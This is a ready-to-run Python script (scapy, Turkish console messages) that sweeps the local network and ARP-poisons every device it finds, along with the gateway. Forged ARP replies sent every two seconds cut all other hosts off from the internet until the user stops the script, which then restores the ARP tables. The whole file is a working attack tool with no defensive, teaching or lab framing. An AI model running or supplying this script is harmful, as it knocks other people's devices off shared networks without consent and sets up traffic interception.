import time
import threading
from scapy.all import *
import netifaces
import signal
import sys
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import random

class FastInternetBlocker:
    def __init__(self):
        self.running = True
        self.gateway_ip = None
        self.gateway_mac = None
        self.local_ip = None
        self.targets = []
        self.lock = threading.Lock()
        self.found_count = 0
        self.animation_chars = ["|", "/", "-", "\\"]
        self.anim_index = 0
        self.start_time = time.time()
        self.cycle_count = 0

        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.running = False
        self.restore_network()

    def update_animation(self):
        self.anim_index = (self.anim_index + 1) % len(self.animation_chars)
        return self.animation_chars[self.anim_index]

    def get_elapsed_time(self):
        elapsed = time.time() - self.start_time
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)

        if hours > 0:
            return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        else:
            return f"{minutes:02d}:{seconds:02d}"

    def discover_network(self):
        try:
            self.gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
            self.gateway_mac = getmacbyip(self.gateway_ip)
            self.local_ip = get_if_addr(conf.iface)
            return True
        except Exception as e:
            return False

    def scan_single_ip(self, ip):
        if not self.running:
            return None

        try:
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                           timeout=0.3, verbose=False, inter=0.1)

            if ans:
                for sent, received in ans:
                    target_mac = received.hwsrc
                    target_ip = received.psrc

                    if target_ip == self.local_ip or target_ip == self.gateway_ip:
                        return None

                    with self.lock:
                        existing = any(t['ip'] == target_ip for t in self.targets)
                        if not existing:
                            self.targets.append({
                                'ip': target_ip,
                                'mac': target_mac
                            })
                            self.found_count += 1
                            self.start_blocking_single(target_ip, target_mac)

                    return {'ip': target_ip, 'mac': target_mac}

        except Exception as e:
            pass

        return None

    def start_blocking_single(self, target_ip, target_mac):
        def block_single():
            while self.running:
                try:
                    sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                          hwdst=target_mac, psrc=self.gateway_ip), verbose=False)
                    sendp(Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip,
                          hwdst=self.gateway_mac, psrc=target_ip), verbose=False)
                except:
                    pass
                time.sleep(2)

        thread = threading.Thread(target=block_single)
        thread.daemon = True
        thread.start()

    def continuous_display(self):
        last_display_time = time.time()

        while self.running:
            current_time = time.time()
            if current_time - last_display_time >= 1.0:
                print("\033[2J\033[H")
                print("="*50)
                print("🚀 ARP SPOOF ÇALIŞIYOR")
                print("="*50)
                print(f"🌐 Gateway: {self.gateway_ip}")
                print(f"💻 Yerel IP: {self.local_ip}")
                print(f"🔧 Gateway MAC: {self.gateway_mac}")
                print("-" * 50)
                print()
                print(f"{self.update_animation()} Arp Spoof modu çalışıyor...")
                print(f"🔄 Tarama turu: {self.cycle_count}")
                print(f"⏱️  Geçen süre: {self.get_elapsed_time()}")
                print(f"📱 Bulunan cihaz: {self.found_count}")
                print()
                print("⏹️  Durdurmak için: Ctrl+C")
                last_display_time = current_time

            time.sleep(0.1)

    def fast_network_scan(self):
        network_prefix = ".".join(self.gateway_ip.split(".")[:3])

        display_thread = threading.Thread(target=self.continuous_display)
        display_thread.daemon = True
        display_thread.start()

        with ThreadPoolExecutor(max_workers=50) as executor:
            ip_list = [f"{network_prefix}.{i}" for i in range(1, 255)]
            future_to_ip = {executor.submit(self.scan_single_ip, ip): ip for ip in ip_list}

            for future in concurrent.futures.as_completed(future_to_ip):
                if not self.running:
                    break
                try:
                    future.result()
                except Exception as e:
                    pass

        self.continuous_blocking()

    def continuous_blocking(self):
        network_prefix = ".".join(self.gateway_ip.split(".")[:3])

        while self.running:
            self.cycle_count += 1

            with ThreadPoolExecutor(max_workers=30) as executor:
                ip_list = [f"{network_prefix}.{random.randint(1, 254)}" for _ in range(50)]
                future_to_ip = {executor.submit(self.scan_single_ip, ip): ip for ip in ip_list}

                for future in concurrent.futures.as_completed(future_to_ip):
                    if not self.running:
                        break
                    try:
                        future.result()
                    except:
                        pass

            time.sleep(10)

    def restore_network(self):
        self.running = False
        time.sleep(1)

        print("\033[2J\033[H")
        print("="*50)
        print("🛑 UYGULAMA DURDURULUYOR")
        print("="*50)
        print("🔧 Internet erişimi düzeltiliyor...")

        fixed_count = 0
        for target in self.targets:
            try:
                sendp(Ether(dst=target['mac'])/ARP(op=2, pdst=target['ip'],
                      hwdst=target['mac'], psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                      count=3, verbose=False)
                sendp(Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip,
                      hwdst=self.gateway_mac, psrc=target['ip'], hwsrc=target['mac']),
                      count=3, verbose=False)
                fixed_count += 1
            except:
                pass

        print(f"✅ {fixed_count} cihazın internet erişimi normale döndü!")
        print(f"⏱️  Toplam çalışma süresi: {self.get_elapsed_time()}")
        print()
        print("👋 Program sonlandırıldı")
        sys.exit(0)

    def show_welcome_screen(self):
        print("\033[2J\033[H")
        print("="*50)
        print("🚀 ARP SPOOF")
        print("="*50)
        print("🔄 Uygulama başlatılıyor...")
        print("⏳ Lütfen bekleyiniz")
        print("="*50)
        time.sleep(2)

    def start(self):
        self.show_welcome_screen()

        if not self.discover_network():
            print("❌ Ağ bilgileri alınamadı!")
            return

        try:
            self.fast_network_scan()
        except KeyboardInterrupt:
            self.restore_network()
        except Exception as e:
            self.restore_network()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("❌ Root yetkisi gerekiyor! sudo ile çalıştırın.")
        sys.exit(1)

    try:
        blocker = FastInternetBlocker()
        blocker.start()
    except KeyboardInterrupt:
        print("\n💥 Program kullanıcı tarafından durduruldu!")
